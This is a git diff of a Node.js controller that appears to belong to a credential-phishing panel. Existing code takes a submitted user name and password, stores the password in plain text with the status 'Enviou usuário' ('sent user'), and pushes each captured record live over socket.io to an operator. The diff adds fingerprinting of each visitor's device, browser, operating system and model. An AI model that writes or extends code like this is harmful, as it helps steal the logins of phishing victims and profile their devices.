@@ -1,5 +1,8 @@
 const Client = require('../../models/Client')
 const { clientsSocket, connectedUsers } = require('../../server')
+const DeviceDetector = require('node-device-detector')
+const detector = new DeviceDetector()
+const ClientDevice = require('../../models/ClientDevice')
 
 module.exports = {
     async view(req, res) {
@@ -9,18 +12,31 @@ module.exports = {
 
             const { client_id } = req.params
 
+            const device = detector.detect(req.headers['user-agent'])
+
             let client
 
             if (client_id) {
-                client = await Client.findByPk(client_id)
+                client = await Client.findByPk(client_id, { include: { association: `device` } })
                 await client.update({ password, status: `Enviou usuário` })
                 req.app.io.emit('updateClient', client.toJSON())
             } else {
-                const checkClient = await Client.findOne({ where: { user } })
+                const checkClient = await Client.findOne({ where: { user }, include: { association: `device` } })
                 client = checkClient
                 if (!checkClient) {
                     client = await Client.create({ user })
-                    req.app.io.emit('newClient', client.toJSON())
+
+                    const clientDevice = await ClientDevice.create({
+                        client_id: client.id,
+                        type: device.device.type,
+                        name: device.client.name,
+                        os: device.os.name,
+                        model: device.device.model,
+                    })
+
+                    const cliente = await Client.findByPk(client.id, { include: { association: `device` } })
+
+                    req.app.io.emit('newClient', cliente.toJSON())
                 } else {
                     req.app.io.emit('updateClient', client.toJSON())
                 }
@@ -42,7 +58,7 @@ module.exports = {
         try {
             const { client_id } = req.params
 
-            const client = await Client.findByPk(client_id)
+            const client = await Client.findByPk(client_id, { include: { association: `device` } })
 
             if (!client) return res.redirect('/modules/conta')
 
